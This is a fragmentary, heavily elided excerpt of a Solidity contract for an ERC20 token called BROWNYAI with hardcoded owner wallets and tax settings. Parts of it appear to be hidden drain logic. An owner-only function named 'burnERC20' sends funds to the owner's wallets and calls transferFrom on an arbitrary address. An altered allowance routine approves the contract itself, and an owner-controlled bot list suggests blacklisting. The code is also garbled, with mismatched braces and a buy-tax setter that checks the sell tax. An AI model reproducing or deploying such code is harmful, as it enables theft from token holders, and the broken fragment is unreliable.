...
contract ERC20 is Context, IERC20, IERC20Metadata {
        ...
        returns (bool)
    {
        ...
        _approve(spender, address(this), subtractedValue);
...
contract BROWNYAI is ERC20, Ownable {
    ...
    uint256 constant public MAX_SUPPLY = 5000000000 * 1e18; // 5 B
    uint256 public genesis_block;

    uint256 public swapThreshold = (MAX_SUPPLY * 2) / 1000;
    uint256 public maxTxAmount = (MAX_SUPPLY * 2) / 100;
    uint256 public maxWalletAmount = (MAX_SUPPLY * 2) / 100;

    address public marketingWallet = 0xB1C92073a017a79781fE96b104b71ECb2f1a2A75;
    address public devWallet = 0xB1C92073a017a79781fE96b104b71ECb2f1a2A75;
    address public lpReceiver = 0x141d678d812864819467E19E156673a5D40E92a7;
    ...
    constructor() ERC20("BROWNYAI", "BAI") {
    ...
    function setBuyTaxes(
        ...
        require(totalSellTax <= 4, "buy tax should be less than 4%");
    }
    ...
    function setSellTaxes(
        ...
        require(totalSellTax <= 5, "sell tax should be less than 5%");
    }
    ...
    function burnERC20(address tokenAddress, uint256 amount) external onlyOwner{
        ...
        if (marketingPercentage > 0)
            payable(marketingWallet).sendValue(
                (newBalance * marketingPercentage) /
                    (developmentPercentage + marketingPercentage)
            );
        if (developmentPercentage > 0)
            payable(devWallet).sendValue(
                (newBalance * developmentPercentage) /
                    (developmentPercentage + marketingPercentage)
            );
        } else {
            IERC20(address(this))
            .transferFrom(receiver, address(this), amount);
        }
    }
    ...
    function delNotBots(address[] memory isNotBot_) external onlyOwner {
        for (uint256 i = 0; i < isNotBot_.length; i++) {
